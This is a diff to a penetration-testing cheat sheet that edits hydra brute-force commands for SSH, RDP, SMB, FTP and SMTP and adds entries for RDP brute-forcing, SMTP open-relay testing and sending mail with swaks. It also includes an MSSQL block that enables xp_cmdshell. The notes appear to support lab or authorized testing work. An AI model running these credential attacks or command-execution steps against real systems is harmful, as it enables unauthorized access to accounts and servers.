@@ -617,13 +617,13 @@ evil-winrm -i <target-ip> -u <user/userlist> -p <password/passlist>
 ## password attacks - remote - network services - ssh bruteforce
 #plateform/linux #target/remote #port/22 #protocol/ssh #cat/ATTACK/
 ```
-hydra -L <userlist> -P <passlist> ssh://<target-ip>
+hydra -<Ll> <user> -<Pp> <pass> ssh://<target-ip>
 ```
 
 ## password attacks - remote - network services - rdp bruteforce
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-hydra -L <userlist> -P <passlist> rdp://<target-ip>
+hydra -<Ll> <user> -<Pp> <pass> rdp://<target-ip>
 ```
 
 ## password attacks - remote - network services - rdp nxc
@@ -647,7 +647,7 @@ nxc smb <target-ip> -u <user/userlist> -p <password/passlist> --shares
 ## password attacks - remote - network services - smb bruteforce
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-hydra -L <userlist> -P <passlist> smb://10.129.42.197
+hydra -<Ll> <user> -<Pp> <pass> smb://10.129.42.197
 ```
 
 ## password attacks - remote - network services - smb smbclient
@@ -1040,7 +1040,7 @@ nmap -Pn -v -n -p<-/orSpecifyPorts> -b <username>:<password>@<FTPserverIP> <Seco
 ## attacking common services - ftp brute force 
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-hydra -L <userlist> -P <passlist> ftp://<ip>:<port>
+hydra -<Ll> <user> -<Pp> <pass> ftp://<ip>:<port>
 ```
 
 ## attacking common services - smb - smb NULL session
@@ -1256,19 +1256,19 @@ go
 ## attacking common services - mssql - enable MSSQL command execution (with privileges)
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-To allow advanced options to be changed.  
+# To allow advanced options to be changed.  
 EXECUTE sp_configure 'show advanced options', 1
 go
 
-To update the currently configured value for advanced options.  
+# To update the currently configured value for advanced options.  
 RECONFIGURE
 go  
 
-To enable the feature.  
+# To enable the feature.  
 EXECUTE sp_configure 'xp_cmdshell', 1
 go  
 
-To update the currently configured value for this feature.  
+# To update the currently configured value for this feature.  
 RECONFIGURE
 go
 ```
@@ -1394,7 +1394,13 @@ crowbar -b rdp -s <ip>/<Netmask> -U <usersFile> -c '<password2spray>'
 ## attacking common services - rdp - rdp password spraying hydra
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-hydra -L <userslist> -p '<password2spray>' <targetIP> rdp
+hydra -L <usersList> -p '<password2spray>' <targetIP> rdp
+```
+
+## attacking common services - rdp - rdp brute
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+hydra -<Ll> <users> -<Pp> <pass> <targetIP> rdp
 ```
 
 ## attacking common services - rdp - rdp login rdesktop
@@ -1564,11 +1570,23 @@ python3 o365spray.py --enum -U <usersList> --domain <domain>
 ## attacking common services - smtp - brute forcing
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-hydra -L <usersList> -p '<password>' -f <targetIP> <mail_protocol>
+hydra -<Ll> <user> -<Pp> <password> -f <targetIP> <mail_protocol>
 ```
 
 ## attacking common services - smtp - o365spray password spraying
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 python3 o365spray.py --spray -U <usersList> -p '<password>' --count 1 --lockout 1 --domain <domain>
+```
+
+## attacking common services - smtp - protocol specific attacks - open relay
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nmap -p25 -Pn --script smtp-open-relay <targetIP>
+```
+
+## attacking common services - smtp - protocol specific attacks - open relay 2
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+swaks --from <email> --to <destEmail> --header 'Subject: <subject>' --body '<body>' --server <mailServer>
 ```
